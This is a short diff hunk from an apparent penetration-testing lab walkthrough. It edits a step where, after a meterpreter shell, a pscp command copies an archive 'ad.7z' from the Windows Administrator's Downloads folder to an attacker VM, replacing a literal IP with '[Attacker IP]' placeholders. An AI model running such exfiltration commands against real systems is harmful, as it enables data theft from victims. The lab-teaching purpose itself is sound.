@@ -473,7 +473,7 @@ meterpreter > shell
 We can now transfer the file `ad.7z` back to our Attacker VM using the following command:
 
 ```bash
-C:\Users\Administrator\Downloads>.\pscp.exe -P 22 .\ad.7z kali@192.168.111.165:/home/kali/Desktop .\pscp.exe -P 22 .\ad.7z kali@192.168.111.165:/home/kali/Desktop
+C:\Users\Administrator\Downloads>.\pscp.exe -P 22 .\ad.7z [username]@[Attacker IP]:/home/kali/Desktop .\pscp.exe -P 22 .\ad.7z [username]@[Attacker IP]:/home/kali/Desktop
 ```
 
 Once executed, type `y` to store and cache the key of the AttackerVM and then type the password:
